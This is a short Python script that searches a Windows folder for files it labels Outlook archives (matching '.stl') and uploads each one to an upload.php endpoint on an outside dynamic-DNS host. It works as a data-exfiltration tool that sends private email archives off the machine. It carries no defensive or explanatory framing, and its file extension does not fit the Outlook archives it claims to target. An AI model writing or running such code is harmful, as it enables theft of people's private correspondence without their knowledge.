


import os
import requests

def find_outlook_archives(directory):
    outlook_archives = []
    for root, dirs, files in os.walk(directory):
        for file in files:
            if file.endswith(".stl"):
                outlook_archives.append(os.path.join(root, file))
    return outlook_archives

def upload_file(file_path, php_upload_url):
    with open(file_path, 'rb') as file:
        files = {'file': file}
        response = requests.post(php_upload_url, files=files)
        return response

# Search for Outlook archive files in the C: drive
archive_files = find_outlook_archives("C:\\tmp\\")
php_upload_url = 'http://littlegrebehouse8.ddns.net:8085/upload.php'
#php_upload_url = 'http://192.168.1.98/upload.php'

# Display found archive files
for archive in archive_files:
    print("Outlook Archive File:", archive)
    file_path = archive
    response = upload_file(file_path, php_upload_url)
    if response.status_code == 200:
        print("File uploaded successfully!")
    else:
        print("Failed to upload file:", response.status_code, response.text)

